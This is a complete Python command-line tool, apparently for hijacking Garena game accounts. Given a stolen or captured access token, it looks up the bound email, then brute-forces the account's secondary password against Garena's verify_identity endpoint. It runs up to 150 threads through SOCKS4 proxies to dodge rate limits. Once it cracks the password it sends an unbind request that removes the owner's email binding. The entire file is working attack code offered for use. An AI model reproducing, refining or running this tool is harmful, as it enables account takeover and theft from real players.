#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Spidey Unbind Tool – Termux CLI version
Usage: python spidey.py <access_token> [options]
"""

import os
import sys
import json
import time
import hashlib
import threading
import argparse
import logging
import signal
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============== DEFAULT CONFIG ===============
DEFAULT_HLO_FILE = "HLO.txt"
DEFAULT_PROXY_FILE = "proxy.txt"
DEFAULT_MAX_WORKERS = 150
CONNECT_TIMEOUT = 15.0
READ_TIMEOUT = 30.0

# =============== LOGGING ===============
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("spidey")

# =============== GLOBALS ===============
stop_workers = threading.Event()
found_code = None
found_identity_token = None
found_lock = threading.Lock()
processed_counter_lock = threading.Lock()
processed_counter = [0]
total_codes = 0
current_code_being_tested = ""

# =============== PROXY HANDLING ===============
def load_proxy_list(proxy_file):
    """Read proxies from file, return list of strings 'ip:port'."""
    if not os.path.exists(proxy_file):
        logger.warning(f"{proxy_file} not found – no proxies loaded.")
        return []
    with open(proxy_file, "r") as f:
        lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return lines

def test_proxy(proxy_url: str, timeout: float = 5.0) -> bool:
    """Test a proxy URL (e.g., socks4://ip:port) with a simple HTTP request."""
    try:
        proxies = {"http": proxy_url, "https": proxy_url}
        resp = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=timeout, verify=False)
        return resp.status_code == 200
    except Exception:
        return False

def find_working_proxy(proxy_file):
    """Scan proxies from file, return first working SOCKS4 URL, or None."""
    proxies = load_proxy_list(proxy_file)
    if not proxies:
        logger.info("No proxies in file – running direct.")
        return None
    logger.info(f"Scanning {len(proxies)} proxies from {proxy_file}...")
    for entry in proxies:
        # Assume SOCKS4 – you can also support SOCKS5 by changing scheme
        proxy_url = f"socks4://{entry}"
        if test_proxy(proxy_url):
            logger.info(f"✅ Working proxy: {proxy_url}")
            return proxy_url
        else:
            logger.debug(f"❌ Dead: {proxy_url}")
    logger.warning("No proxy works – running direct.")
    return None

def get_proxy_dict(proxy_url):
    if proxy_url:
        return {"http": proxy_url, "https": proxy_url}
    return None

# =============== CORE FUNCTIONS ===============
def get_bound_email(access_token, proxy_url=None):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        params = {'app_id': '100067', 'access_token': access_token}
        headers = {'User-Agent': 'GarenaMSDK/4.0.30'}
        proxies = get_proxy_dict(proxy_url)
        resp = requests.get(url, params=params, headers=headers, proxies=proxies, timeout=10, verify=False)
        if resp.status_code != 200:
            return None, f"API error: HTTP {resp.status_code}"
        data = resp.json()
        email = data.get('email')
        if not email:
            return None, "No email bound."
        return email, None
    except Exception as e:
        return None, f"Failed: {str(e)}"

def verify_code(email, access_token, hashed_code, proxy_url=None):
    if stop_workers.is_set():
        return None
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
    headers = {
        'User-Agent': 'GarenaMSDK/4.0.30',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
    }
    data = {
        'email': email,
        'app_id': '100067',
        'access_token': access_token,
        'secondary_password': hashed_code
    }
    proxies = get_proxy_dict(proxy_url)
    try:
        resp = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=8, verify=False)
        if resp.status_code != 200:
            return None
        json_data = resp.json()
        return json_data.get('identity_token')
    except Exception:
        return None

def worker_task(email, access_token, code_queue, proxy_url):
    global current_code_being_tested
    while not stop_workers.is_set():
        try:
            code = code_queue.get(timeout=0.5)
        except:
            break
        if stop_workers.is_set():
            break
        current_code_being_tested = code
        hashed = hashlib.sha256(code.encode('utf-8')).hexdigest()
        with processed_counter_lock:
            processed_counter[0] += 1
        token = verify_code(email, access_token, hashed, proxy_url)
        if token:
            with found_lock:
                if not stop_workers.is_set():
                    stop_workers.set()
                    global found_code, found_identity_token
                    found_code = code
                    found_identity_token = token
            break

def run_bruteforce(email, access_token, codes, proxy_url, max_workers):
    global stop_workers, found_code, found_identity_token, processed_counter, total_codes
    stop_workers.clear()
    found_code = None
    found_identity_token = None
    processed_counter = [0]
    total_codes = len(codes)
    code_queue = Queue()
    for c in codes:
        code_queue.put(c)

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(worker_task, email, access_token, code_queue, proxy_url)
                   for _ in range(max_workers)]
        for future in as_completed(futures):
            if stop_workers.is_set():
                for f in futures:
                    f.cancel()
                break
    return found_code, found_identity_token

def send_unbind_request(access_token, identity_token, proxy_url=None):
    url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
    headers = {
        'User-Agent': 'GarenaMSDK/4.0.30',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'app_id': '100067',
        'access_token': access_token,
        'identity_token': identity_token
    }
    proxies = get_proxy_dict(proxy_url)
    try:
        resp = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=10, verify=False)
        return resp.text
    except Exception as e:
        return f"Error: {str(e)}"

# =============== PROGRESS DISPLAY ===============
def print_progress():
    """Print a one‑line progress update."""
    count = processed_counter[0] if processed_counter else 0
    total = total_codes
    current = current_code_being_tested
    pct = count * 100 // total if total else 0
    sys.stdout.write(f"\r⏳ Testing: {current:<20} | Progress: {count}/{total} ({pct}%)")
    sys.stdout.flush()

def progress_updater(stop_event):
    """Thread that updates progress every second."""
    while not stop_event.is_set():
        print_progress()
        time.sleep(1)

# =============== SIGNAL HANDLING ===============
def signal_handler(sig, frame):
    print("\n🛑 Interrupted, stopping workers...")
    stop_workers.set()
    sys.exit(0)

# =============== MAIN ===============
def main():
    parser = argparse.ArgumentParser(description="Garena unbind brute‑force tool")
    parser.add_argument("access_token", help="Access token of the account")
    parser.add_argument("-c", "--codes", default=DEFAULT_HLO_FILE, help=f"File with codes (default: {DEFAULT_HLO_FILE})")
    parser.add_argument("-p", "--proxy", default=DEFAULT_PROXY_FILE, help=f"Proxy file (default: {DEFAULT_PROXY_FILE})")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_MAX_WORKERS, help=f"Number of threads (default: {DEFAULT_MAX_WORKERS})")
    parser.add_argument("--no-unbind", action="store_true", help="Skip sending unbind request after success")
    parser.add_argument("--no-proxy", action="store_true", help="Do not use proxies (direct connection)")
    parser.add_argument("-q", "--quiet", action="store_true", help="Suppress progress output")
    args = parser.parse_args()

    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)

    # Load codes
    if not os.path.exists(args.codes):
        logger.error(f"❌ Codes file '{args.codes}' not found.")
        sys.exit(1)
    with open(args.codes, "r") as f:
        codes = [line.strip() for line in f if line.strip()]
    if not codes:
        logger.error(f"❌ Codes file '{args.codes}' is empty.")
        sys.exit(1)
    logger.info(f"📄 Loaded {len(codes)} codes from {args.codes}")

    # Proxy setup
    proxy_url = None
    if not args.no_proxy:
        proxy_url = find_working_proxy(args.proxy)
        if proxy_url:
            logger.info(f"✅ Using proxy: {proxy_url}")
        else:
            logger.info("🌐 Running without proxy")
    else:
        logger.info("🌐 Proxies disabled, running direct")

    # Get email
    logger.info("🔄 Fetching bound email...")
    email, error = get_bound_email(args.access_token, proxy_url)
    if error:
        logger.error(f"❌ {error}")
        sys.exit(1)
    logger.info(f"✅ Bound email: {email}")

    # Start brute‑force
    logger.info(f"🔍 Starting brute‑force with {args.threads} workers...")
    stop_event = threading.Event()
    if not args.quiet:
        progress_thread = threading.Thread(target=progress_updater, args=(stop_event,), daemon=True)
        progress_thread.start()

    start_time = time.time()
    found_code, identity_token = run_bruteforce(email, args.access_token, codes, proxy_url, args.threads)
    stop_event.set()
    elapsed = time.time() - start_time

    # Clear progress line
    if not args.quiet:
        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.flush()

    if found_code:
        logger.info(f"✅ **SUCCESS!** Cracked code: {found_code}")
        logger.info(f"🔑 Identity token: {identity_token}")
        if not args.no_unbind:
            logger.info("📨 Sending unbind request...")
            response = send_unbind_request(args.access_token, identity_token, proxy_url)
            logger.info(f"📨 Unbind response: {response}")
        else:
            logger.info("⏭️ Unbind request skipped (--no-unbind)")
        sys.exit(0)
    else:
        logger.error("❌ No valid code found.")
        sys.exit(1)

if __name__ == "__main__":
    main()
